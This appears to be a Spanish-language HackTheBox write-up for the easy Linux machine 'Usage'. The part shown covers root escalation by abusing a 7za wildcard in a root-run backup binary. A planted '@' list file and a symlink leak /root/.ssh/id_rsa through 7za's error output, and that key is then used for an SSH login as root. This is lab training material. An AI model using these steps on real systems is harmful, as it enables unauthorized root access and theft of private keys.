_________

Usage es una máquina Linux de dificultad fácil en HackTheBox en la que conseguimos acceso gracias a una cadena de vulnerabilidades. Empezamos con una inyección SQL algo escondida en el reset de contraseñas, pasamos por un CVE en laravel-admin para ganar acceso al sistema y terminamos abusando de un comodín mal implementado en un binario con privilegios de root.

![img](assets/usage/usagePort.png)

![img](assets/usage/use20.png)

Lo ideal sería transferir el binario a nuestra máquina para realizar ingeniería inversa con `ghidra`, sin embargo, ejecutando `strings` sobre el binario obtenemos información suficiente. La opción 1 ejecuta `7za` para crear un archivo `.zip` en `/var/backups`, la opción 2 llama a `mysqldump` para volcar una base de datos en `/var/backups` y la opción 3 no queda del todo clara. Lo más destacable es el uso de un comodín en el comando `7za`, algo que puede ser peligroso. En esta sección de [hacktricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z) se explica en detalle el riesgo que supone el uso de comodines con `7z`.

![img](assets/usage/use21.png)

El ataque aprovecha cómo `7z` maneja los comodines. Se crean dos archivos:

- `@whatever` → le indica a 7z que lea `whatever` como una lista de archivos a comprimir
- `whatever` → un enlace simbólico que apunta al archivo que queremos leer

Cuando 7z ejecuta el comodín, el comando resultante es:

```bash
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- @whatever whatever [otherfiles]
```

Como el contenido del archivo al que apunta el symlink no es una lista de archivos válida, 7z lo imprime en los errores, logrando así leer el contenido de un archivo arbitrario del sistema. Nos dirigimos a la ruta del proyecto `/var/www/html` para crear un symlink de la clave ssh de root. 

```bash
cd /var/www/html
touch @root.txt
xander@usage:/var/www/html$ ln -sf /root/.ssh/id_rsa root.txt
xander@usage:/var/www/html$ ls -la
total 16
drwxrwxrwx  4 root   xander 4096 Mar 26 12:13 .
drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
-rw-rw-r--  1 xander xander    0 Mar 26 12:13 @root.txt
lrwxrwxrwx  1 xander xander   17 Mar 26 12:13 root.txt -> /root/.ssh/id_rsa
drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
```

Una vez creado el symlink ejecutamos el binario y elegimos la opción 1 para que cree una copia del proyecto y vemos como se logra ver la clave ssh de root de la que hemos realizado el enlace. 

![img](assets/usage/use22.png)

Copiamos el contenido a nuestro host añadiendo los permisos `chmod 600 id_rsa` y entramos como root al objetivo. 

```bash
ssh -i id_rsa root@10.129.10.75
```
